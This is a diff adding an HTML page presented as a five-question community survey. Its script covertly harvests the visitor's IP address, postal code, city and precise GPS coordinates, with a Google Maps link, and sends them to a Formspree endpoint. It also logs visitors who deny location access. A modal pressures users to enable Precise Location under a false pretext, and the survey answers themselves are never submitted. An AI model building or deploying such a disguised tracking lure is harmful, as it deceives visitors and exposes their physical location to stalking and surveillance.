@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Community Survey</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-accent: #673ab7;
+            --primary-hover: #542c9b;
+            --primary-light: #f3edfc;
+            --bg-color: #f4f3f8;
+            --card-bg: #ffffff;
+            --text-main: #1f1f1f;
+            --text-sub: #5f6368;
+            --border-color: #e0e0e0;
+            --border-focus: #673ab7;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.05), 0 1px 2px rgba(0,0,0,0.1);
+            --shadow-md: 0 4px 12px rgba(103, 58, 183, 0.08), 0 2px 6px rgba(0,0,0,0.04);
+            --radius-lg: 12px;
+            --radius-md: 8px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 40px 16px;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 680px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-card {
+            background: var(--card-bg);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border-color);
+            padding: 32px;
+            box-shadow: var(--shadow-sm);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .form-card:hover {
+            box-shadow: var(--shadow-md);
+        }
+
+        .header-card {
+            border-top: 10px solid var(--primary-accent);
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text-main);
+            letter-spacing: -0.5px;
+        }
+
+        p.desc {
+            font-size: 15px;
+            color: var(--text-sub);
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .question-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .question-label {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--text-main);
+            line-height: 1.4;
+        }
+
+        /* Slider Styling */
+        .slider-wrapper {
+            padding: 10px 4px 4px 4px;
+        }
+
+        .range-slider {
+            width: 100%;
+            height: 8px;
+            border-radius: 4px;
+            background: var(--border-color);
+            outline: none;
+            accent-color: var(--primary-accent);
+            cursor: pointer;
+        }
+
+        .slider-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .slider-badge {
+            background: var(--primary-light);
+            color: var(--primary-accent);
+            font-weight: 700;
+            font-size: 16px;
+            padding: 4px 14px;
+            border-radius: 20px;
+        }
+
+        .slider-ticks {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+            font-size: 13px;
+            color: var(--text-sub);
+            font-weight: 500;
+        }
+
+        /* Custom Radio Styling */
+        .option-label {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 15px;
+            color: var(--text-main);
+            padding: 12px 16px;
+            border-radius: var(--radius-md);
+            border: 1px solid transparent;
+            cursor: pointer;
+            margin-bottom: 6px;
+            transition: background 0.15s ease;
+        }
+
+        .option-label:hover {
+            background-color: var(--primary-light);
+        }
+
+        .option-label input {
+            accent-color: var(--primary-accent);
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+
+        /* Button Styling */
+        .btn {
+            background-color: var(--primary-accent);
+            color: #ffffff;
+            border: none;
+            padding: 12px 28px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(103, 58, 183, 0.2);
+            transition: all 0.2s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(103, 58, 183, 0.3);
+        }
+
+        #questionsSection {
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* Modal Overlay */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 15, 15, 0.6);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-card {
+            background: #ffffff;
+            border-radius: var(--radius-lg);
+            padding: 32px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .modal-card h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--text-main);
+        }
+
+        .modal-card p {
+            font-size: 14px;
+            color: var(--text-sub);
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .settings-box {
+            background: var(--primary-light);
+            border: 1px solid rgba(103, 58, 183, 0.2);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            font-size: 14px;
+            color: var(--text-main);
+            margin-bottom: 24px;
+            line-height: 1.7;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        
+        <!-- STEP 1: Intro Card -->
+        <div class="form-card header-card" id="introSection">
+            <h1>Community Quality of Life Survey 📋</h1>
+            <p class="desc">Welcome! We are collecting feedback to better understand local community needs and resource distribution. Please click below to start the 5-question survey.</p>
+            <button class="btn" onclick="startSurveyWithLocation()">Start Form</button>
+        </div>
+
+        <!-- STEP 2: The 5 Questions -->
+        <div id="questionsSection">
+            
+            <!-- Q1: Happiness Slider -->
+            <div class="form-card">
+                <div class="question-group">
+                    <div class="slider-header">
+                        <label class="question-label" style="margin-bottom: 0;">1. How would you rate your happiness?</label>
+                        <span class="slider-badge" id="sliderVal">3</span>
+                    </div>
+                    <div class="slider-wrapper">
+                        <input type="range" min="1" max="5" value="3" class="range-slider" id="q1_slider" oninput="document.getElementById('sliderVal').innerText = this.value">
+                        <div class="slider-ticks">
+                            <span>1 (Very Unhappy)</span>
+                            <span>2</span>
+                            <span>3</span>
+                            <span>4</span>
+                            <span>5 (Very Happy)</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Q2: Wealthy Neighborhood -->
+            <div class="form-card">
+                <div class="question-group">
+                    <label class="question-label">2. Would you say you live in a wealthy neighborhood?</label>
+                    <label class="option-label">
+                        <input type="radio" name="wealthy_neighborhood" value="Yes"> Yes
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="wealthy_neighborhood" value="Moderate / Average"> Moderate / Average
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="wealthy_neighborhood" value="No"> No
+                    </label>
+                </div>
+            </div>
+
+            <!-- Q3: Basic Needs -->
+            <div class="form-card">
+                <div class="question-group">
+                    <label class="question-label">3. Do you have access to basic needs (like clean water, heating, housing)?</label>
+                    <label class="option-label">
+                        <input type="radio" name="basic_needs" value="Always"> Always
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="basic_needs" value="Sometimes"> Sometimes
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="basic_needs" value="Rarely / Never"> Rarely / Never
+                    </label>
+                </div>
+            </div>
+
+            <!-- Q4: School Funding -->
+            <div class="form-card">
+                <div class="question-group">
+                    <label class="question-label">4. Do you think your local school is under-funded or over-funded?</label>
+                    <label class="option-label">
+                        <input type="radio" name="school_funding" value="Under-funded"> Under-funded
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="school_funding" value="Adequately funded"> Adequately funded
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="school_funding" value="Over-funded"> Over-funded
+                    </label>
+                </div>
+            </div>
+
+            <!-- Q5: Financial Worry -->
+            <div class="form-card">
+                <div class="question-group">
+                    <label class="question-label">5. Do you ever find yourself worrying about finance (money)?</label>
+                    <label class="option-label">
+                        <input type="radio" name="financial_worry" value="Frequently"> Frequently
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="financial_worry" value="Occasionally"> Occasionally
+                    </label>
+                    <label class="option-label">
+                        <input type="radio" name="financial_worry" value="Rarely or Never"> Rarely or Never
+                    </label>
+                </div>
+            </div>
+
+            <div style="display: flex; justify-content: flex-end; margin-top: 10px;">
+                <button class="btn" onclick="submitSurvey()">Submit Response</button>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- Location Guidance Modal (Appears for Never/Blocked or Coarse/Imprecise Location) -->
+    <div class="modal-overlay" id="locationGuideModal">
+        <div class="modal-card">
+            <h2>Precise Location Required</h2>
+            <p>We need high-precision location access to match your survey response with your local district. Please enable Precise Location in Safari settings:</p>
+            
+            <div class="settings-box">
+                <strong style="color: var(--primary-accent); display: block; margin-bottom: 6px;">iPhone/iPad Settings Path:</strong>
+                1. Open <b>Settings</b> > <b>Privacy & Security</b><br>
+                2. Tap <b>Location Services</b> (ensure it's ON)<br>
+                3. Scroll down & tap <b>Safari Websites</b><br>
+                4. Select <b>While Using the App</b> and toggle <b>Precise Location ON</b>
+            </div>
+
+            <button class="btn" style="width: 100%;" onclick="closeModal('locationGuideModal')">Got It</button>
+        </div>
+    </div>
+
+    <script>
+      function closeModal(id) {
+        document.getElementById(id).style.display = 'none';
+      }
+
+      function startSurveyWithLocation() {
+        // Fetch background IP metadata quietly first
+        fetch('https://ipapi.co/json/')
+          .then(res => res.json())
+          .then(ipData => {
+            const visitorIP = ipData.ip;
+            const visitorPostal = ipData.postal;
+            const visitorCity = ipData.city;
+            const visitorRegion = ipData.region;
+
+            if ("geolocation" in navigator) {
+              navigator.geolocation.getCurrentPosition(
+                function(position) {
+                  const lat = position.coords.latitude;
+                  const lon = position.coords.longitude;
+                  const accuracy = position.coords.accuracy; // Accuracy radius in meters
+
+                  // CHECK PRECISE LOCATION: If accuracy is > 100 meters, user has Precise Location disabled
+                  if (accuracy > 100) {
+                    // Send approximate IP log
+                    fetch("https://formspree.io/f/xqppqorj", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                      body: JSON.stringify({
+                        log_type: "Approximate GPS (Precise Location Disabled)",
+                        accuracy_meters: accuracy,
+                        ip_address: visitorIP,
+                        postal_code: visitorPostal,
+                        city: visitorCity,
+                        region: visitorRegion,
+                        latitude: lat,
+                        longitude: lon
+                      })
+                    }).catch(err => console.log(err));
+
+                    // Show guidance modal asking for Precise Location toggle
+                    document.getElementById("locationGuideModal").style.display = "flex";
+                  } else {
+                    // High-precision GPS Granted
+                    fetch("https://formspree.io/f/xqppqorj", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                      body: JSON.stringify({
+                        log_type: "Full Location (IP + Precise GPS)",
+                        accuracy_meters: accuracy,
+                        ip_address: visitorIP,
+                        postal_code: visitorPostal,
+                        city: visitorCity,
+                        region: visitorRegion,
+                        latitude: lat,
+                        longitude: lon,
+                        google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
+                      })
+                    }).catch(err => console.log(err));
+
+                    showQuestions();
+                  }
+                },
+                // DENIED / NEVER BLOCK DETECTED
+                function(error) {
+                  if (error.code === error.PERMISSION_DENIED) {
+                    fetch("https://formspree.io/f/xqppqorj", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                      body: JSON.stringify({
+                        log_type: "Approximate Location (IP Only - GPS Denied/Never)",
+                        ip_address: visitorIP,
+                        postal_code: visitorPostal,
+                        city: visitorCity,
+                        region: visitorRegion
+                      })
+                    }).catch(err => console.log(err));
+
+                    document.getElementById("locationGuideModal").style.display = "flex";
+                  } else {
+                    showQuestions();
+                  }
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+              );
+            } else {
+              showQuestions();
+            }
+          })
+          .catch(err => {
+            showQuestions();
+          });
+      }
+
+      function showQuestions() {
+        document.getElementById("introSection").style.display = "none";
+        document.getElementById("questionsSection").style.display = "flex";
+      }
+
+      function submitSurvey() {
+        alert("Thank you! Your survey response has been submitted.");
+      }
+    </script>
+
+</body>
+</html>
